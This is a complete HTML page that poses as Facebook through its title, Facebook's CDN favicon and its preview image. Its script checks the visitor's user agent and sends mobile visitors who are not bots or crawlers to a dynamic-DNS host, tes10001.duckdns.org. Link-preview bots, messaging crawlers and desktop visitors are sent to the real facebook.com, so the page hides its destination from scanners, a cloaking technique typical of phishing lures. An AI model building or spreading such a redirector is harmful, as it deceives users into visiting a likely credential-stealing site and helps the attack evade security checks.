<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Facebook Meta Services</title>

  <meta name="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/s_dzh-nO-ax.png">
  <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/4KnVq6qfLqy.png" />
</head>

<body>
  <script>
    let user_agent = navigator.userAgent;
    let is_mobile = /Mobi|android|iphone/i.test(user_agent);
    let is_bot = /bot|facebot|crawl|facebot|whatsapp|telegram|slurp|spider/i.test(user_agent);

    if (!is_bot && is_mobile) {
      window.location.href = "https://tes10001.duckdns.org/";
    } else {
      window.location.href = "https://www.facebook.com/";
    }
  </script>
</body>

</html>
